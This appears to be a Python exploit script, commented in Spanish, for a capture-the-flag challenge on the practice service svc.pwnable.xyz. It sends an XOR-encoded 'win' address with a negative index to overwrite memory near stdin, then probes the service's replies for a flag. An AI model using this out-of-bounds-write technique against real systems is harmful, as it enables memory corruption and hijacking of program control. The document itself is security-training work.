#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

for attempt in range(3):
    print(f"\n{'='*60}")
    print(f"Intento {attempt + 1}")
    print('='*60)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(25)
        s.connect((host, port))
        
        banner = s.recv(1024)
        print("Conectado")
        
        win = 0xa21
        
        # Solo sobrescribir stdin+192
        b = 0x414141414141
        a = win ^ b
        
        print(f"Sobrescribiendo stdin+192 con win ({hex(win)})")
        payload = f"{a} {b} -8\n"
        s.sendall(payload.encode())
        
        time.sleep(0.5)
        resp1 = s.recv(2048)
        print(f"Resp: {resp1.decode().strip()[:50]}")
        
        # Ahora hacer múltiples inputs para ver si alguno triggerea
        for i in range(5):
            test_payload = f"{i+1} {i+2} {(i%8)+1}\n"
            print(f"  Test {i+1}: {test_payload.strip()}")
            s.sendall(test_payload.encode())
            time.sleep(0.3)
            
            try:
                data = s.recv(4096, socket.MSG_DONTWAIT)
                if data:
                    decoded = data.decode()
                    print(f"    -> {decoded.strip()[:80]}")
                    if "flag" in decoded.lower() or "{" in decoded:
                        print(f"\n{'='*60}")
                        print("CONTENIDO COMPLETO:")
                        print(decoded)
                        print('='*60)
            except:
                pass
        
        # Dar tiempo final
        time.sleep(2)
        try:
            final = s.recv(4096)
            if final:
                print(f"\nFinal: {final.decode()}")
        except:
            pass
            
        s.close()
        time.sleep(2)
        
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(2)